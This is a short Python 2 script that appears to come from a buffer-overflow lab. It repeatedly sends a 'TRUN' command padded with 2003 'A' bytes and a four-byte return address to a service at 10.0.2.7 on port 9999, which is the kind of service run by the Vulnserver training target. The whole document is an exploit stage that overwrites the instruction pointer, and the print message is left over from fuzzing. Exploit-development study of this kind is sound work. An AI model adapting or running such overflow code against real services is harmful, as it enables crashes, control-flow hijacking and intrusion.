import sys, socket

buffer = "A" * 2003 + "\xaf\x11\x50\x62"

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('10.0.2.7',9999))

        s.send(('TRUN /.:/' + buffer))
        s.close()

    except:
        print "Fuzzing crashed at %s bytes" %str(len(buffer))
        sys.exit()